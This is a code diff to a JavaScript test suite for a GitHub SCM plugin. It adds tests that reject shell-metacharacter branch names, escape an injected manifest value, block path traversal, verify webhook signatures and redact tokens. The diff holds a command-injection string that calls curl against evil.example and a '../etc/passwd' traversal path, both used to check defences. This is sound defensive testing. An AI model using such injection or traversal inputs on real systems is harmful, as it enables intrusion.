@@ -24,11 +24,9 @@ const testWebhookConfigOpen = require('./data/webhookConfig.pull_request.opened.
 const testWebhookConfigPushBadHead = require('./data/webhookConfig.push.badHead.json');
 const testWebhookConfigPush = require('./data/webhookConfig.push.json');
 const testCommands = require('./data/commands.json');
-const testSpecialCharacterCommands = require('./data/specialCharacterCommands.json');
 const testReadOnlyCommandsSsh = require('./data/readOnlyCommandsSsh.json');
 const testReadOnlyCommandsHttps = require('./data/readOnlyCommandsHttps.json');
 const testPrCommands = require('./data/prCommands.json');
-const testSpecialCharacterPrCommands = require('./data/specialCharacterPrCommands.json');
 const testForkPrCommands = require('./data/forkPrCommands.json');
 const testCustomPrCommands = require('./data/customPrCommands.json');
 const testRepoCommands = require('./data/repoCommands.json');
@@ -293,11 +291,24 @@ describe('index', function () {
                 assert.deepEqual(command, testCommands);
             }));
 
-        it('promises to get the checkout command for the pipeline special character branch', () => {
-            config.branch = `'"\`/@.]!#&%$<>,🚗`;
+        it('rejects branch names containing shell metacharacters', () => {
+            config.branch = `'"\`;!#&$<>`;
+
+            return scm.getCheckoutCommand(config).then(
+                () => assert.fail('expected getCheckoutCommand to reject'),
+                err => {
+                    assert.match(err.message, /Invalid branch name/);
+                    assert.equal(err.statusCode, 400);
+                }
+            );
+        });
+
+        it('accepts branch names with conservatively-safe special characters', () => {
+            config.branch = 'feature/some_module.v1+rc1-final@host';
 
             return scm.getCheckoutCommand(config).then(command => {
-                assert.deepEqual(command, testSpecialCharacterCommands);
+                assert.isString(command.command);
+                assert.isAbove(command.command.length, 0);
             });
         });
 
@@ -343,13 +354,17 @@ describe('index', function () {
             });
         });
 
-        it('promises to get the checkout command for a pull request with special character branch', () => {
+        it('rejects PR branch names containing shell metacharacters', () => {
             config.prRef = 'pull/3/merge';
-            config.prBranchName = `'"\`/@.]!#&%$<>,🚗`;
+            config.prBranchName = `'"\`;!#&$<>`;
 
-            return scm.getCheckoutCommand(config).then(command => {
-                assert.deepEqual(command, testSpecialCharacterPrCommands);
-            });
+            return scm.getCheckoutCommand(config).then(
+                () => assert.fail('expected getCheckoutCommand to reject'),
+                err => {
+                    assert.match(err.message, /Invalid PR branch name/);
+                    assert.equal(err.statusCode, 400);
+                }
+            );
         });
 
         it('promises to get the checkout command for a pull request from forked repo', () => {
@@ -382,6 +397,17 @@ describe('index', function () {
 
             return scm.getCheckoutCommand(config).then(command => {
                 assert.deepEqual(command, testRepoCommands);
+            });
+        });
+
+        it('escapes shell metacharacters in the repo manifest value', () => {
+            config.manifest = `x'; curl http://evil.example/pwn; echo 'x`;
+
+            return scm.getCheckoutCommand(config).then(command => {
+                assert.include(
+                    command.command,
+                    `sd-repo -manifestUrl='x'"'"'; curl http://evil.example/pwn; echo '"'"'x' -sourceRepo=`
+                );
             });
         });
 
@@ -1492,6 +1518,22 @@ jobs:
                     assert.strictEqual(error.statusCode, 403);
                 });
         });
+
+        it('rejects getFile when the path contains traversal segments', () => {
+            return scm
+                .getFile({
+                    scmUri: 'github.com:123456:master',
+                    path: '../etc/passwd',
+                    token: 'fake-token'
+                })
+                .then(
+                    () => assert.fail('expected getFile to reject'),
+                    err => {
+                        assert.match(err.message, /Path traversal detected/);
+                        assert.equal(err.statusCode, 400);
+                    }
+                );
+        });
     });
 
     describe('_getRepoInfo', () => {
@@ -2115,7 +2157,52 @@ jobs:
                     assert.fail('This should not fail the tests');
                 })
                 .catch(err => {
-                    assert.equal(err.message, 'Invalid x-hub-signature');
+                    assert.equal(err.message, 'Invalid webhook signature');
+                    assert.strictEqual(err.statusCode, 400);
+                });
+        });
+
+        it('accepts x-hub-signature-256 as the webhook signature', () => {
+            const payloadText = JSON.stringify(testPayloadPush);
+            const headers = {
+                'x-hub-signature-256': `sha256=${crypto
+                    .createHmac('sha256', 'somesecret')
+                    .update(payloadText)
+                    .digest('hex')}`,
+                'x-github-event': 'push',
+                'x-github-delivery': '3c77bf80-9a2f-11e6-80d6-72f7fe03ea29'
+            };
+
+            return scm.parseHook(headers, payloadText).then(result => {
+                assert.deepEqual(result, {
+                    action: 'push',
+                    branch: 'master',
+                    checkoutUrl: 'git@github.com:baxterthehacker/public-repo.git',
+                    sha: '0d1a26e67d8f5eaf1f6ba5c57fc3c7d91ac0fd1c',
+                    type: 'repo',
+                    username: 'baxterthehacker2',
+                    commitAuthors: ['baxterthehacker'],
+                    lastCommitMessage: 'lastcommitmessage',
+                    hookId: '3c77bf80-9a2f-11e6-80d6-72f7fe03ea29',
+                    scmContext: 'github:github.com',
+                    ref: 'refs/heads/master',
+                    addedFiles: ['README.md'],
+                    modifiedFiles: ['README.md', 'package.json'],
+                    removedFiles: ['screwdriver.yaml']
+                });
+            });
+        });
+
+        it('rejects webhooks with no signature header', () => {
+            delete testHeaders['x-hub-signature'];
+
+            return scm
+                .parseHook(testHeaders, JSON.stringify(testPayloadPush))
+                .then(() => {
+                    assert.fail('This should not fail the tests');
+                })
+                .catch(err => {
+                    assert.match(err.message, /Missing webhook signature/);
                     assert.strictEqual(err.statusCode, 400);
                 });
         });
@@ -4123,5 +4210,47 @@ jobs:
                 slug
             });
         });
+    });
+});
+
+describe('sanitizeError', () => {
+    const { sanitizeError } = require('../index.js');
+
+    it('redacts authorization-bearing fields at top level', () => {
+        const err = new Error('boom');
+        err.token = 'ghp_topsecret';
+        err.headers = { Authorization: 'token ghp_topsecret', 'content-type': 'application/json' };
+
+        const out = sanitizeError(err);
+        assert.equal(out.token, '[REDACTED]');
+        assert.equal(out.headers.Authorization, '[REDACTED]');
+        assert.equal(out.headers['content-type'], 'application/json');
+    });
+
+    it('redacts at arbitrary depth in Octokit-shaped errors', () => {
+        const err = {
+            message: 'Request failed',
+            request: { headers: { authorization: 'token ghp_x' }, url: 'https://api.github.com/foo' },
+            response: { status: 500, headers: { 'x-ratelimit-remaining': '0' } }
+        };
+
+        const out = sanitizeError(err);
+        assert.equal(out.request.headers.authorization, '[REDACTED]');
+        assert.equal(out.request.url, 'https://api.github.com/foo');
+        assert.equal(out.response.status, 500);
+    });
+
+    it('handles circular references without throwing', () => {
+        const err = { name: 'CircularErr' };
+        err.self = err;
+        const out = sanitizeError(err);
+        assert.equal(out.name, 'CircularErr');
+        assert.equal(out.self, '[Circular]');
+    });
+
+    it('returns primitives unchanged', () => {
+        assert.equal(sanitizeError(null), null);
+        assert.equal(sanitizeError('plain'), 'plain');
+        assert.equal(sanitizeError(42), 42);
     });
 });
